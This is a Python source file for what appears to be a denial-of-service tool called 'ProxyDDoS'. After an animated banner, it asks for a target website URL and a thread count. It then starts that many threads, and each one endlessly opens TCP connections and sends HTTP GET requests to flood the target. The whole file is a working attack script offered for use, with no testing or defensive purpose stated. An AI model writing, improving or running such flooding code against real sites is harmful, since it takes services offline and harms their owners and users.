import socket
import threading
import requests
from pystyle import Anime, Colors, Colorate
import sys

sys.stdout.write("\x1b]2;ProxyDDoS\x07")

class bcolors:
    PURPLE2 = '\033[1;35m'
    ENDC = '\033[0m'

def startlogo():
    logo = """

 ________  __                                            __  __  __                     
/        |/  |                                          /  |/  |/  |                    
$$$$$$$$/ $$ |____    ______    ______    ______    ____$$ |$$ |$$/  _______    ______  
   $$ |   $$      \  /      \  /      \  /      \  /    $$ |$$ |/  |/       \  /      \ 
   $$ |   $$$$$$$  |/$$$$$$  |/$$$$$$  | $$$$$$  |/$$$$$$$ |$$ |$$ |$$$$$$$  |/$$$$$$  |
   $$ |   $$ |  $$ |$$ |  $$/ $$    $$ | /    $$ |$$ |  $$ |$$ |$$ |$$ |  $$ |$$    $$ |
   $$ |   $$ |  $$ |$$ |      $$$$$$$$/ /$$$$$$$ |$$ \__$$ |$$ |$$ |$$ |  $$ |$$$$$$$$/ 
   $$ |   $$ |  $$ |$$ |      $$       |$$    $$ |$$    $$ |$$ |$$ |$$ |  $$ |$$       |
   $$/    $$/   $$/ $$/        $$$$$$$/  $$$$$$$/  $$$$$$$/ $$/ $$/ $$/   $$/  $$$$$$$/ 
                                                                                        
                                                                                        
                                                                                       
        Github: https://github.com/Threadlinee

[$] Start System...
"""
    Anime.Fade((logo), Colors.blue_to_purple, Colorate.Vertical, time=2)

def flood_direct(host, port, path):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((host, port))

            request = f"GET {path} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n"
            s.sendall(request.encode())

            print(f"[+] Sent request to {host}:{port}")
            s.close()
        except Exception as e:
            print(f"[!] Error: {e}")

def setup():
    target_url = input(f"{bcolors.PURPLE2}[$] Enter the target website URL: {bcolors.ENDC}")
    url_parts = requests.utils.urlparse(target_url)
    host = url_parts.hostname
    port = url_parts.port if url_parts.port else 80
    path = url_parts.path if url_parts.path else "/"

    threads = int(input(f"{bcolors.PURPLE2}[$] Number of threads to use: {bcolors.ENDC}"))

    print(f"\n[✓] Flooding {host}:{port}{path} with {threads} threads...\n")

    for _ in range(threads):
        thread = threading.Thread(target=flood_direct, args=(host, port, path))
        thread.daemon = True
        thread.start()

    while True:
        pass

def startup():
    startlogo()
    setup()

startup()
